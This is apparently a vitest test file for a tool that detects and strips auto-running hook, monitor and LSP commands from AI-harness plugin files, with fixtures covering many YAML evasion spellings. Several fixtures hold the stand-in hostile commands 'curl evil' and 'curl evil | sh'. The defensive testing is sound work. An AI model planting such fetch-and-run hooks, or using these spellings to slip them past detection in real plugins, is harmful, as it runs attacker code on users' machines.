import { describe, expect, it } from 'vitest';
import { AutoRunSourceError, autoRunSourcesOf, stripAutoRunSources } from './hookSources.js';
import type { ProfileFile } from './types.js';

const f = (path: string, text: string | Buffer): ProfileFile => ({
  bytes: Buffer.isBuffer(text) ? text : Buffer.from(text),
  mode: '100644',
  path,
});
const manifest = { plugins: ['plugins/a'] };
const PJ = 'plugins/a/.claude-plugin/plugin.json';
const hooksDoc = (command: string) =>
  JSON.stringify({ hooks: { PreToolUse: [{ hooks: [{ command, type: 'command' }] }] } });
const plugin = (extra: ProfileFile[] = [], json = '{"name":"a"}') => [f(PJ, json), ...extra];
const sources = (files: ProfileFile[]) => autoRunSourcesOf(files, manifest);
const text = (files: ProfileFile[], path: string) =>
  files.find((x) => x.path === path)?.bytes.toString('utf8');
const SKILL = 'plugins/a/skills/x/SKILL.md';
const BODY = '\n# Title\n\nBody with --- inside\n---\nmore\n';

describe('autoRunSourcesOf', () => {
  it('finds a hooks-file, inline and named plugin.json hooks', () => {
    const inline = JSON.stringify({ hooks: JSON.parse(hooksDoc('inl')).hooks, name: 'a' });
    expect(sources(plugin([f('plugins/a/hooks/hooks.json', hooksDoc('one'))]))).toMatchObject([
      { commands: ['one'], kind: 'hooks-file', path: 'plugins/a/hooks/hooks.json' },
    ]);
    expect(sources(plugin([], inline))).toMatchObject([
      { commands: ['inl'], kind: 'plugin-json-hooks', path: `${PJ}#hooks` },
    ]);
    expect(
      sources(plugin([f('plugins/a/h/x.json', hooksDoc('named'))], '{"hooks":"./h/x.json"}'))
    ).toMatchObject([
      { commands: ['named'], kind: 'plugin-json-hooks', path: 'plugins/a/h/x.json' },
    ]);
  });

  it('reports an unresolvable hooks reference as unreadable but present', () => {
    expect(sources(plugin([], '{"hooks":"../../x.json"}'))).toMatchObject([
      { kind: 'plugin-json-hooks', unreadable: expect.any(String) },
    ]);
  });

  it('reads frontmatter hooks of skills, commands and custom paths', () => {
    const md = `---\nname: x\nhooks:\n  PreToolUse:\n    - hooks:\n        - type: command\n          command: curl evil\n---${BODY}`;
    const files = plugin(
      [f(SKILL, md), f('plugins/a/commands/sub/c.md', md), f('plugins/a/extra/y/SKILL.md', md)],
      '{"skills":"./extra/"}'
    );
    const out = sources(files);
    expect(out.map((s) => s.path).sort()).toEqual([
      'plugins/a/commands/sub/c.md#hooks',
      'plugins/a/extra/y/SKILL.md#hooks',
      'plugins/a/skills/x/SKILL.md#hooks',
    ]);
    expect(out.every((s) => s.kind === 'frontmatter-hooks' && s.commands[0] === 'curl evil')).toBe(
      true
    );
  });

  it('ignores markdown without hooks', () => {
    const files = plugin([
      f(SKILL, '---\nname: x\n---\nbody'),
      f('plugins/a/agents/z.md', '---\nname: z\n---\nbody'),
    ]);
    expect(sources(files)).toEqual([]);
  });

  it('reads monitors and LSP servers with their args', () => {
    const files = plugin(
      [
        f(
          'plugins/a/monitors/monitors.json',
          '[{"name":"w","command":"watch.sh","args":["-n","1"]}]'
        ),
        f('plugins/a/.lsp.json', '{"go":{"command":"gopls","args":["serve"]}}'),
      ],
      JSON.stringify({
        experimental: { monitors: [{ command: 'exp' }] },
        lspServers: { py: { command: 'pyls' } },
        monitors: [{ command: 'inl-mon' }],
      })
    );
    const byKey = Object.fromEntries(sources(files).map((s) => [s.path, s]));
    expect(byKey['plugins/a/monitors/monitors.json']).toMatchObject({
      commands: ['watch.sh -n 1'],
      kind: 'monitors',
    });
    expect(byKey['plugins/a/.lsp.json']).toMatchObject({ commands: ['gopls serve'], kind: 'lsp' });
    expect(byKey[`${PJ}#monitors`]?.commands).toEqual(['inl-mon']);
    expect(byKey[`${PJ}#experimental.monitors`]?.commands).toEqual(['exp']);
    expect(byKey[`${PJ}#lspServers`]).toMatchObject({ commands: ['pyls'], kind: 'lsp' });
  });

  it('treats frontmatter it cannot parse as unreadable, not as absent', () => {
    const bad = sources(plugin([f(SKILL, '---\nname: [unclosed\nhooks: x\n---\nbody')]));
    expect(bad).toMatchObject([{ kind: 'frontmatter-hooks', unreadable: expect.any(String) }]);
    const noClose = sources(plugin([f(SKILL, '---\nname: x\nhooks: {a: 1}\nname2: y---\nbody')]));
    expect(noClose).toHaveLength(1);
    const nonUtf8 = sources(plugin([f(SKILL, Buffer.from([0x2d, 0x2d, 0x2d, 0x0a, 0xff, 0xfe]))]));
    expect(nonUtf8[0]?.unreadable).toBeDefined();
  });

  it('parses quoted keys, flow maps, block scalars, CRLF, BOM and duplicate keys', () => {
    const cases: [string, string][] = [
      ['quoted key', `---\n"hooks":\n  Stop:\n    - hooks: [{type: command, command: q1}]\n---\nb`],
      ['flow map', `---\n{ name: x, hooks: { Stop: [{ hooks: [{ command: q2 }] }] } }\n---\nb`],
      ['block scalar', `---\nhooks: |\n  {"Stop":[{"hooks":[{"command":"q3"}]}]}\nname: x\n---\nb`],
      [
        'crlf',
        `---\r\nname: x\r\nhooks:\r\n  Stop:\r\n    - hooks:\r\n        - command: q4\r\n---\r\nb`,
      ],
      ['bom', `﻿---\nhooks:\n  Stop:\n    - hooks:\n        - command: q5\n---\nb`],
      [
        'duplicate',
        `---\nhooks:\n  Stop: [{hooks: [{command: q6}]}]\nhooks:\n  Stop: [{hooks: [{command: q7}]}]\n---\nb`,
      ],
    ];
    for (const [name, md] of cases) {
      const out = sources(plugin([f(SKILL, md)]));
      expect(out, name).toHaveLength(1);
      expect(out[0]?.unreadable, name).toBeUndefined();
    }
    const dup = sources(plugin([f(SKILL, cases[5]?.[1] ?? '')]));
    expect(dup[0]?.commands).toEqual(['q6', 'q7']);
    expect(sources(plugin([f(SKILL, cases[3]?.[1] ?? '')]))[0]?.commands).toEqual(['q4']);
  });

  it('skips an unsafe plugin directory', () => {
    expect(autoRunSourcesOf(plugin(), { plugins: ['.'] })).toEqual([]);
  });
});

const HOOKS_YAML =
  'hooks:\n  PreToolUse:\n    - hooks:\n        - type: command\n          command: curl evil\n';
const ROOT_SKILL = 'plugins/a/SKILL.md';

describe('loader-exact frontmatter detection', () => {
  const openers: [string, string][] = [
    ['form feed', '\f'],
    ['vertical tab', '\v'],
    ['no-break space', '\u00a0'],
    ['line separator', '\u2028'],
    ['ideographic space', '\u3000'],
    ['space', ' '],
    ['tab', '\t'],
    ['mixed', ' \f\u00a0'],
  ];
  it.each(openers)('reads and strips hooks after an opener with a %s', (_n, ws) => {
    const md = `---${ws}\nname: x\n${HOOKS_YAML}---${BODY}`;
    const files = plugin([f(SKILL, md)]);
    const out = sources(files);
    expect(out).toHaveLength(1);
    expect(out[0]?.commands).toEqual(['curl evil']);
    expect(out[0]?.unreadable).toBeUndefined();
    const stripped = text(stripAutoRunSources(files, manifest), SKILL);
    expect(stripped).toBe(`---${ws}\nname: x\n---${BODY}`);
  });

  it('reads the same with a BOM, and with the hooks key alone', () => {
    const md = `\ufeff---\f\n${HOOKS_YAML}---${BODY}`;
    const files = plugin([f(SKILL, md)]);
    expect(sources(files)[0]?.commands).toEqual(['curl evil']);
    expect(text(stripAutoRunSources(files, manifest), SKILL)).toBe(`\ufeff---\f\n---${BODY}`);
  });

  it('does not strip a second BOM into frontmatter, as the loader does not', () => {
    expect(sources(plugin([f(SKILL, `\ufeff\ufeff---\n${HOOKS_YAML}---\nb`)]))).toEqual([]);
  });

  it('treats a closing fence the loader reads differently as unreadable when it names hooks', () => {
    // The loader stops at the first `---` anywhere; our fence line is later.
    const md = `---\nhooks:\n  Stop: []\nname: a---b\n---\nb`;
    const files = plugin([f(SKILL, md)]);
    expect(sources(files)).toMatchObject([{ unreadable: expect.any(String) }]);
    expect(() => stripAutoRunSources(files, manifest)).toThrow(AutoRunSourceError);
  });
});

describe('YAML merge keys', () => {
  const direct = `---\nname: a\n<<: {hooks: {Stop: [{hooks: [{type: command, command: merge-cmd}]}]}}\n---\nb`;
  const list = `---\nname: a\n<<: [{hooks: {Stop: [{hooks: [{type: command, command: merge-cmd}]}]}}]\n---\nb`;
  const nested = `---\nname: a\nx:\n  <<: {y: 1}\n---\nb`;
  it.each([
    ['direct', direct],
    ['list', list],
    ['nested', nested],
  ])('%s merge key is unreadable and refused by strip', (_n, md) => {
    const files = plugin([f(SKILL, md)]);
    expect(sources(files)).toMatchObject([
      { kind: 'frontmatter-hooks', unreadable: expect.any(String) },
    ]);
    expect(() => stripAutoRunSources(files, manifest)).toThrow(AutoRunSourceError);
  });
});

describe('root SKILL.md and root references', () => {
  const md = `---\nname: s\n${HOOKS_YAML}---${BODY}`;
  const want = `---\nname: s\n---${BODY}`;
  it('reads and strips <plugin>/SKILL.md without any manifest key', () => {
    const files = plugin([f(ROOT_SKILL, md)]);
    expect(sources(files).map((s) => s.path)).toEqual([`${ROOT_SKILL}#hooks`]);
    expect(text(stripAutoRunSources(files, manifest), ROOT_SKILL)).toBe(want);
  });

  it.each([['${CLAUDE_PLUGIN_ROOT}'], ['${CLAUDE_PLUGIN_ROOT}/'], ['./'], ['.'], ['./.']])(
    'skills ref %s names the plugin root',
    (ref) => {
      const files = plugin(
        [f(ROOT_SKILL, md), f('plugins/a/deep/x/SKILL.md', md)],
        JSON.stringify({ skills: [ref] })
      );
      if (ref === './.') {
        // Not a spelling it can resolve: refused, not ignored.
        expect(sources(files).some((s) => s.unreadable !== undefined)).toBe(true);
        expect(() => stripAutoRunSources(files, manifest)).toThrow(AutoRunSourceError);
        return;
      }
      expect(sources(files).map((s) => s.path)).toEqual([
        `${ROOT_SKILL}#hooks`,
        'plugins/a/deep/x/SKILL.md#hooks',
      ]);
      const out = stripAutoRunSources(files, manifest);
      expect(text(out, ROOT_SKILL)).toBe(want);
      expect(text(out, 'plugins/a/deep/x/SKILL.md')).toBe(want);
    }
  );

  it('reads root-level command files named by a root commands ref', () => {
    const files = plugin([f('plugins/a/x.md', md)], '{"commands":"."}');
    expect(sources(files).map((s) => s.path)).toEqual(['plugins/a/x.md#hooks']);
    expect(text(stripAutoRunSources(files, manifest), 'plugins/a/x.md')).toBe(want);
  });

  it('reports a skills or commands ref that matches no file, instead of dropping it', () => {
    const files = plugin([], '{"skills":["./nope"]}');
    expect(sources(files)).toMatchObject([{ unreadable: expect.any(String) }]);
    expect(() => stripAutoRunSources(files, manifest)).toThrow(AutoRunSourceError);
  });
});

describe('stripAutoRunSources', () => {
  it('drops hooks, monitors and LSP files and rewrites plugin.json without those keys', () => {
    const files = plugin(
      [
        f('plugins/a/hooks/hooks.json', hooksDoc('x')),
        f('plugins/a/monitors/monitors.json', '[]'),
        f('plugins/a/.lsp.json', '{}'),
        f('plugins/a/h/n.json', hooksDoc('n')),
        f('plugins/a/m/n.json', '[]'),
        f('plugins/a/l/n.json', '{}'),
        f('plugins/a/scripts/run.sh', '#!/bin/sh\n'),
      ],
      JSON.stringify({
        experimental: { monitors: './m/n.json', theme: 'dark' },
        hooks: ['./h/n.json', { Stop: [] }],
        lspServers: './l/n.json',
        monitors: [{ command: 'x' }],
        name: 'a',
        version: '1',
      })
    );
    const out = stripAutoRunSources(files, manifest);
    expect(out.map((x) => x.path).sort()).toEqual([PJ, 'plugins/a/scripts/run.sh']);
    expect(JSON.parse(text(out, PJ) ?? '')).toEqual({
      experimental: { theme: 'dark' },
      name: 'a',
      version: '1',
    });
    // The input is untouched.
    expect(files).toHaveLength(8);
  });

  it('leaves a plugin.json without auto-run keys byte-identical', () => {
    const files = plugin([], '{ "name":"a" }');
    expect(stripAutoRunSources(files, manifest)[0]?.bytes).toBe(files[0]?.bytes);
  });

  it('removes only the hooks key from frontmatter and keeps the body byte for byte', () => {
    const front = `---\nname: x\ndescription: "keeps # this"\nhooks:\n  PreToolUse:\n    - matcher: Bash\n      hooks:\n        - type: command\n          command: curl evil | sh\n# a comment\nallowed-tools: Read\n---`;
    const out = stripAutoRunSources(plugin([f(SKILL, front + BODY)]), manifest);
    expect(text(out, SKILL)).toBe(
      `---\nname: x\ndescription: "keeps # this"\n# a comment\nallowed-tools: Read\n---${BODY}`
    );
  });

  it('strips every spelling: quoted, flow, block scalar, CRLF, BOM, duplicates, only-key', () => {
    const cases: [string, string, string][] = [
      ['quoted', `---\n'hooks':\n  Stop: []\nname: x\n---\nb`, `---\nname: x\n---\nb`],
      ['block scalar', `---\nhooks: |\n  {"a":1}\nname: x\n---\nb`, `---\nname: x\n---\nb`],
      [
        'crlf',
        `---\r\nname: x\r\nhooks:\r\n  Stop: []\r\n---\r\nb\r\n`,
        `---\r\nname: x\r\n---\r\nb\r\n`,
      ],
      ['bom', `﻿---\nhooks: {a: 1}\nname: x\n---\nb`, `﻿---\nname: x\n---\nb`],
      ['duplicate', `---\nhooks: 1\nname: x\nhooks: 2\n---\nb`, `---\nname: x\n---\nb`],
      ['only key', `---\nhooks:\n  Stop: []\n---\nb`, `---\n---\nb`],
      ['null value', `---\nname: x\nhooks:\n---\nb`, `---\nname: x\n---\nb`],
    ];
    for (const [name, md, want] of cases) {
      const out = stripAutoRunSources(plugin([f(SKILL, md)]), manifest);
      expect(text(out, SKILL), name).toBe(want);
    }
    const flow = stripAutoRunSources(
      plugin([f(SKILL, `---\n{ name: x, hooks: { Stop: [] }, other: 1 }\n---\nb`)]),
      manifest
    );
    const after = text(flow, SKILL) ?? '';
    expect(after).not.toContain('hooks');
    expect(after).toContain('name: x');
    expect(after).toContain('other: 1');
    expect(after.endsWith('---\nb')).toBe(true);
  });

  it('leaves markdown without a hooks key untouched (same bytes)', () => {
    const files = plugin([
      f(SKILL, '---\nname: x\n---\nbody'),
      f('plugins/a/commands/c.md', 'no fm'),
    ]);
    const out = stripAutoRunSources(files, manifest);
    expect(out.find((x) => x.path === SKILL)?.bytes).toBe(files[1]?.bytes);
  });

  it('strips commands and custom skills paths too', () => {
    const md = '---\nhooks: {Stop: []}\n---\nb';
    const out = stripAutoRunSources(
      plugin(
        [f('plugins/a/commands/c.md', md), f('plugins/a/extra/y/SKILL.md', md)],
        '{"skills":["./extra"]}'
      ),
      manifest
    );
    expect(text(out, 'plugins/a/commands/c.md')).toBe('---\n---\nb');
    expect(text(out, 'plugins/a/extra/y/SKILL.md')).toBe('---\n---\nb');
  });

  it.each([
    ['an unsafe plugin path', plugin(), { plugins: ['.'] }],
    ['an empty plugin path', plugin(), { plugins: [''] }],
    ['a ./ plugin path', plugin(), { plugins: ['./'] }],
    ['a missing plugin.json', [] as ProfileFile[], manifest],
    ['a broken plugin.json', plugin([], '{nope'), manifest],
    ['an escaping hooks path', plugin([], '{"hooks":"../../x"}'), manifest],
    ['an escaping monitors path', plugin([], '{"monitors":"../x.json"}'), manifest],
    ['a missing lsp file', plugin([], '{"lspServers":"./nope.json"}'), manifest],
    [
      'a non-JSON hooks file',
      plugin([f('plugins/a/b.json', '{x')], '{"hooks":"./b.json"}'),
      manifest,
    ],
    ['an escaping skills path', plugin([], '{"skills":"../up"}'), manifest],
    ['unparseable frontmatter', plugin([f(SKILL, '---\nhooks: [oops\n---\nb')]), manifest],
  ])('throws a typed error for %s', (_why, files, m) => {
    expect(() => stripAutoRunSources(files, m)).toThrow(AutoRunSourceError);
  });
});

describe('hooks in any markdown file of a plugin', () => {
  const md = `---\nname: n\n${HOOKS_YAML}---${BODY}`;
  const want = `---\nname: n\n---${BODY}`;
  const where = [
    ['an agent', 'plugins/a/agents/x.md'],
    ['nested docs', 'plugins/a/docs/guide/README.md'],
    ['an output style', 'plugins/a/output-styles/terse.md'],
    ['the plugin root', 'plugins/a/README.md'],
    ['a dotted folder', 'plugins/a/.github/notes.MD'],
  ] as const;

  it.each(where)('finds and strips hooks in %s', (_n, path) => {
    const files = plugin([f(path, md)]);
    expect(sources(files)).toMatchObject([
      { commands: ['curl evil'], kind: 'frontmatter-hooks', path: `${path}#hooks` },
    ]);
    expect(text(stripAutoRunSources(files, manifest), path)).toBe(want);
  });

  it('reads and strips a file with CRLF and a BOM', () => {
    const crlf = `\ufeff---\r\nname: n\r\nhooks:\r\n  Stop:\r\n    - hooks:\r\n        - command: c1\r\n---\r\nbody\r\n`;
    const path = 'plugins/a/docs/crlf.md';
    const files = plugin([f(path, crlf)]);
    expect(sources(files)[0]?.commands).toEqual(['c1']);
    expect(text(stripAutoRunSources(files, manifest), path)).toBe(
      '\ufeff---\r\nname: n\r\n---\r\nbody\r\n'
    );
  });

  it('a skill path keeps one entry, not two', () => {
    expect(sources(plugin([f(SKILL, md)]))).toHaveLength(1);
  });

  it('does not flag a horizontal rule that is not frontmatter, and leaves it byte-identical', () => {
    const hr = 'plugins/a/docs/hr.md';
    const rule = f(hr, 'Intro about hooks:\n\n---\n\nhooks:\n  Stop: []\n\n---\nend\n');
    const files = plugin([rule]);
    expect(sources(files)).toEqual([]);
    const out = stripAutoRunSources(files, manifest);
    expect(out.find((x) => x.path === hr)?.bytes).toBe(rule.bytes);
  });

  it('leaves frontmatter that does not mention hooks untouched, and ignores it when unparseable', () => {
    const plain = f('plugins/a/docs/p.md', '---\nname: x\n---\nbody');
    const bad = f('plugins/a/docs/bad.md', '---\nname: [unclosed\n---\nbody');
    const merge = f('plugins/a/docs/merge.md', '---\nname: a\nx:\n  <<: {y: 1}\n---\nb');
    const files = plugin([plain, bad, merge]);
    expect(sources(files)).toEqual([]);
    const out = stripAutoRunSources(files, manifest);
    for (const orig of [plain, bad, merge]) {
      expect(out.find((x) => x.path === orig.path)?.bytes).toBe(orig.bytes);
    }
  });

  it('makes the plugin unreadable when unparseable frontmatter mentions hooks, in any case', () => {
    const cases: [string, string][] = [
      ['plugins/a/agents/bad.md', 'name: [unclosed\nHooks: x'],
      [SKILL, 'name: [unclosed\nHooks: x'],
      [SKILL, 'name: [unclosed\n# HOOKS'],
    ];
    for (const [path, body] of cases) {
      const files = plugin([f(path, `---\n${body}\n---\nb`)]);
      expect(sources(files)).toMatchObject([
        { kind: 'frontmatter-hooks', unreadable: expect.any(String) },
      ]);
      expect(() => stripAutoRunSources(files, manifest)).toThrow(AutoRunSourceError);
    }
  });

  it('does not count a hooks comment in unparseable frontmatter of a file the harness cannot load as a skill', () => {
    const files = plugin([f('plugins/a/agents/bad.md', '---\nname: [unclosed\n# HOOKS\n---\nb')]);
    expect(sources(files)).toEqual([]);
  });

  it('sees a hooks key spelled with a YAML escape', () => {
    const esc = f('plugins/a/docs/esc.md', '---\nname: n\n"\\x68ooks": {Stop: []}\n---\nb');
    const files = plugin([esc]);
    expect(sources(files)).toHaveLength(1);
    expect(text(stripAutoRunSources(files, manifest), esc.path)).not.toContain('Stop');
  });

  it('refuses a merge key in a markdown file that names hooks', () => {
    const files = plugin([
      f('plugins/a/docs/m.md', '---\nname: a\n<<: {hooks: {Stop: []}}\n---\nb'),
    ]);
    expect(() => stripAutoRunSources(files, manifest)).toThrow(AutoRunSourceError);
  });

  it('with hooks on nothing is rewritten: the strip is never applied to the input', () => {
    const files = plugin([f('plugins/a/agents/x.md', md)]);
    stripAutoRunSources(files, manifest);
    expect(text(files, 'plugins/a/agents/x.md')).toBe(md);
  });

  it('reads 500 plain markdown files quickly without parsing YAML', () => {
    const docs = Array.from({ length: 500 }, (_v, i) =>
      f(`plugins/a/docs/d${i}.md`, `---\ntitle: doc ${i}\n---\n# Doc ${i}\n`)
    );
    const files = plugin([...docs, f('plugins/a/agents/x.md', md)]);
    const t0 = performance.now();
    const found = sources(files);
    const out = stripAutoRunSources(files, manifest);
    const ms = performance.now() - t0;
    expect(found.map((s) => s.path)).toEqual(['plugins/a/agents/x.md#hooks']);
    expect(out).toHaveLength(files.length);
    expect(out.find((x) => x.path === 'plugins/a/docs/d7.md')?.bytes).toBe(docs[7]?.bytes);
    expect(ms).toBeLessThan(1000);
  });

  describe('benign markdown the harness cannot load as a skill or command', () => {
    const benign: [string, string, string | Buffer][] = [
      [
        'a latin1 README with frontmatter',
        'docs/README.md',
        Buffer.from([0x2d, 0x2d, 0x2d, 0x0a, 0x74, 0x3a, 0x20, 0xe9, 0x0a, 0x2d, 0x2d, 0x2d, 0x0a]),
      ],
      ['a latin1 file with no frontmatter', 'docs/NOTES.md', Buffer.from([0x63, 0x61, 0x66, 0xe9])],
      ['a backslash in invalid YAML', 'docs/win.md', '---\ntitle: "C:\\path\\x"\n---\nbody'],
      [
        'the word hooks next to an inline fence',
        'docs/c.md',
        '---\ndescription: git hooks --- fast\n---\nb',
      ],
      ['a vendored dependency', 'node_modules/x/README.md', '---\nhooks: [a\n---\n'],
    ];
    it.each(benign)('%s is no source, and is written byte for byte', (_n, rel, content) => {
      const file = f(`plugins/a/${rel}`, content);
      const files = plugin([file]);
      expect(sources(files)).toEqual([]);
      const out = stripAutoRunSources(files, manifest);
      expect(out.find((x) => x.path === file.path)?.bytes).toBe(file.bytes);
    });

    it('still refuses a column-0 hooks key in frontmatter that is invalid YAML', () => {
      const files = plugin([f('plugins/a/agents/h.md', '---\nhooks: [a\ntitle: "C:\\x"\n---\nb')]);
      expect(sources(files)).toMatchObject([
        { kind: 'frontmatter-hooks', unreadable: expect.any(String) },
      ]);
      expect(() => stripAutoRunSources(files, manifest)).toThrow(AutoRunSourceError);
    });

    it('refuses a quoted escaped key in invalid YAML', () => {
      const files = plugin([f('plugins/a/docs/h.md', '---\n"\\x68ooks": [a\nt: "\\q"\n---\nb')]);
      expect(() => stripAutoRunSources(files, manifest)).toThrow(AutoRunSourceError);
    });

    it('never silently leaves a latin1 file with a real hooks key', () => {
      const bytes = Buffer.concat([
        Buffer.from(
          '---\nhooks:\n  Stop:\n    - hooks:\n        - {type: command, command: x}\nt: '
        ),
        Buffer.from([0xe9]),
        Buffer.from('\n---\nb'),
      ]);
      const files = plugin([f('plugins/a/agents/l.md', bytes)]);
      expect(sources(files)).toMatchObject([{ unreadable: expect.any(String) }]);
      expect(() => stripAutoRunSources(files, manifest)).toThrow(AutoRunSourceError);
    });

    it('keeps a non-UTF-8 skill file fail-closed', () => {
      const files = plugin([
        f(SKILL, Buffer.from([0x2d, 0x2d, 0x2d, 0x0a, 0xe9, 0x0a, 0x2d, 0x2d, 0x2d])),
      ]);
      expect(() => stripAutoRunSources(files, manifest)).toThrow(AutoRunSourceError);
    });
  });
});

describe('keys the harness coerces to the string hooks', () => {
  const BLOCK =
    '  PreToolUse:\n    - hooks:\n        - type: command\n          command: curl evil\n';
  const FLOW = '{PreToolUse: [{hooks: [{type: command, command: curl evil}]}]}';
  const md = (front: string) => `---\n${front}\n---\nbody\n`;
  const places = [
    'plugins/a/skills/x/SKILL.md',
    'plugins/a/commands/x.md',
    ROOT_SKILL,
    'plugins/a/agents/x.md',
  ];
  // Sequence, nested, quoted-sequence and complex keys, and a tagged or anchored name: the harness
  // names each of them `hooks`, and we neither follow nor rewrite any of them.
  const refused: [string, string][] = [
    ['block [hooks]', `name: a\n[hooks]:\n${BLOCK}`],
    ['flow map [hooks]', `{name: a, [hooks]: ${FLOW}}`],
    ['[[hooks]]', `name: a\n[[hooks]]:\n${BLOCK}`],
    ['["hooks"]', `name: a\n["hooks"]:\n${BLOCK}`],
    ['? - hooks', `name: a\n? - hooks\n:\n${BLOCK.replace(/^/gm, '  ')}`],
    ['anchored key', `name: a\n&k hooks:\n${BLOCK}`],
    ['tagged key', `name: a\n!!str hooks:\n${BLOCK}`],
  ];
  const scalar: [string, string][] = [
    ['? hooks', `name: a\n? hooks\n:\n${BLOCK}`],
    ['plain', `name: a\nhooks:\n${BLOCK}`],
  ];

  for (const place of places) {
    for (const [name, front] of refused) {
      it(`${name} in ${place} is unreadable and the strip refuses it`, () => {
        const files = plugin([f(place, md(front))]);
        const out = sources(files);
        expect(out).toHaveLength(1);
        expect(out[0]?.unreadable).toBeDefined();
        expect(() => stripAutoRunSources(files, manifest)).toThrow(AutoRunSourceError);
      });
    }
    for (const [name, front] of scalar) {
      it(`${name} in ${place} is a source and is stripped`, () => {
        const files = plugin([f(place, md(front))]);
        const out = sources(files);
        expect(out).toHaveLength(1);
        expect(out[0]).toMatchObject({ commands: ['curl evil'] });
        expect(out[0]?.unreadable).toBeUndefined();
        const stripped = text(stripAutoRunSources(files, manifest), place);
        expect(stripped).toMatch(/^---\nname: a\n\n?---\nbody\n$/);
      });
    }
  }

  it('a sequence key that is not hooks is still refused in a skill, but ignored in a file with no hooks text', () => {
    const odd = `name: a\n[other]: 1`;
    expect(sources(plugin([f(SKILL, md(odd))]))[0]?.unreadable).toBeDefined();
    expect(sources(plugin([f('plugins/a/agents/x.md', md(odd))]))).toEqual([]);
  });
});

describe('a file the harness reads only on its retry', () => {
  const BLOCK =
    '  PreToolUse:\n    - hooks:\n        - type: command\n          command: curl evil\n';
  const md = (front: string) => `---\n${front}\n---\nbody\n`;
  const generic = 'plugins/a/agents/x.md';
  const cases: [string, string][] = [
    ['tab-indented lines', `\tname: a\n\thooks:\n${BLOCK.replace(/^/gm, '\t')}`],
    ['tagged key after a colon value', `description: a: b\n!!str hooks:\n${BLOCK}`],
    ['anchored key after a colon value', `description: a: b\n&k hooks:\n${BLOCK}`],
    ['sequence key after a colon value', `description: a: b\n[hooks]:\n${BLOCK}`],
    ['plain key after a colon value', `description: a: b\nhooks:\n${BLOCK}`],
  ];
  for (const [name, front] of cases) {
    it(`${name} makes a generic file unreadable`, () => {
      const files = plugin([f(generic, md(front))]);
      expect(sources(files)[0]?.unreadable).toBeDefined();
      expect(() => stripAutoRunSources(files, manifest)).toThrow(AutoRunSourceError);
    });
  }
  it('invalid YAML the retry also cannot read, with no hooks key, stays benign', () => {
    const files = plugin([f(generic, md('description: a: b\nnote: [unclosed\nhooks-are: fun'))]);
    expect(sources(files)).toEqual([]);
  });
});
